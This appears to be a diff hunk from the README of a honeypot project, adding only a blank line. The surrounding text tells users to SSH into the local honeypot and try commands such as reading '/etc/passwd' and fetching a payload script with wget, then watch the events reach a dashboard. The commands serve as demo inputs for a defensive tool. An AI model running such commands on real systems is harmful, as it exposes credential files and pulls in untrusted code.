@@ -47,6 +47,7 @@ Dashboard loads at `http://localhost:3000` or the live demo at [honeypot-network
 ssh root@localhost -p 2222
 ```
 
+
 Use any password. Run commands like `ls`, `cat /etc/passwd`, `wget http://example.com/payload.sh`, and watch events stream into the dashboard.
 
 > [!TIP]
